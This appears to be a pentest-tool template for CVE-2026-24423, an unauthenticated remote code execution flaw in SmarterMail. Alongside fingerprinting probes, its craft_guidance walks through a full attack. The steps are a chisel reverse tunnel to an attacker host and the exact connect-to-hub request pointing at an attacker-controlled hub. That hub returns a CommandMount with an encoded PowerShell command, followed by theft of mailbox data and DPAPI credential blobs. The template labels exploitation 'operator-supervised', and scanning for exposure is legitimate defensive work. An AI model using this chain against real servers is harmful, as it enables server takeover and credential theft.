description: SmarterTools SmarterMail — CVE-2026-24423 unauthenticated remote code execution via the sysadmin connect-to-hub flow (SSRF-to-hostile-hub -> SystemMount.CommandMount blindly executed). Affects builds prior to 9511. Detection-only endpoint/product fingerprints; the hostile-hub weaponisation is operator-supervised (Rule 5 / manual_chain).
craft_guidance: 1. SmarterMail commonly listens on 17017 (web UI) and 9998; in hardened installs it is bound to 127.0.0.1 only. If you already have a foothold, pivot: `chisel client ATTACKER:9001 R:17017:127.0.0.1:17017` (server side `chisel server -p 9001 --reverse`), then test http://127.0.0.1:17017 locally through Burp.

2. FINGERPRINT: Server header `SmarterMail`, /interface/root, /api/v1/ SwaggerUI, login body markers 'SmarterMail'/'SmarterTools'. Grab the build number (Help/About or /api/v1/settings/sysadmin/product-info) — CVE-2026-24423 is fixed in 9511; earlier builds are vulnerable.

3. CVE-2026-24423 unauth RCE lives at POST /api/v1/settings/sysadmin/connect-to-hub. Body: {"hubAddress":"http://ATTACKER:8081/","oneTimePassword":"test","nodeName":"victim"}. The server makes an unauthenticated outbound call to hubAddress (this is the SSRF primitive).

4. OOB CONFIRMATION (Rule 9a — benign, no code exec): set hubAddress to your Collaborator/callback URL (generate_collaborator_payload) and POST. An inbound HTTP/DNS hit proves the server fetches attacker-controlled hubAddress unauthenticated — the CVE-2026-24423 precondition. This is the safe detection step; do NOT ship a CommandMount payload during detection.

5. WEAPONISATION (operator-supervised): the hostile hub answers the node-management handshake (POST /web/api/node-management/setup-initial-connection) with a JSON body whose SystemMount.CommandMount holds an OS command; SmarterMail executes it as the service account (svc_mail). Use a base64 -EncodedCommand (UTF-16LE) for a PowerShell one-liner. Confirm with a benign marker first (`powershell -c "$env:USERNAME"`), not a reverse shell, unless RoE permits foothold.

6. POST-RCE: svc_mail can read the SmarterMail data tree — C:\SmarterMail\Domains\<domain>\Users (and .bak backups) enumerate mailbox owners; user profiles under C:\Users\<u>\AppData\Roaming\Microsoft hold DPAPI masterkeys + credential blobs. Pivot to the network lane: record_loot the DPAPI artifacts, then impacket-dpapi (see playbook-red-team-web / redteam_tool_guide).

smartermail_connect_to_hub_rce_2026.description: CVE-2026-24423 — SmarterMail sysadmin connect-to-hub unauthenticated RCE. The endpoint issues an unauthenticated outbound request to a caller-supplied hubAddress; a hostile hub returns SystemMount.CommandMount which SmarterMail executes as svc_mail. Detection = confirm the connect-to-hub endpoint + SmarterMail product family are reachable; the CommandMount payload is operator-supervised (manual_chain).

probes.description: connect-to-hub endpoint present (SmarterMail JSON envelope on the sysadmin API) confirms the CVE-2026-24423 attack surface is exposed pre-auth. Fingerprint only — no hubAddress/CommandMount sent. Run the OOB confirmation from craft_guidance step 4 to prove the SSRF, then escalate operator-supervised.

smartermail_product_fingerprint.description: SmarterMail web UI / REST fingerprint — confirms the affected product family and, via the build number, whether it predates the 9511 CVE-2026-24423 fix.

probes.description: SmarterMail web client root present (SmarterMail/SmarterTools markers) — affected product confirmed.
SmarterMail sysadmin product-info endpoint — exposes the build/version used to confirm CVE-2026-24423 applicability (< 9511).
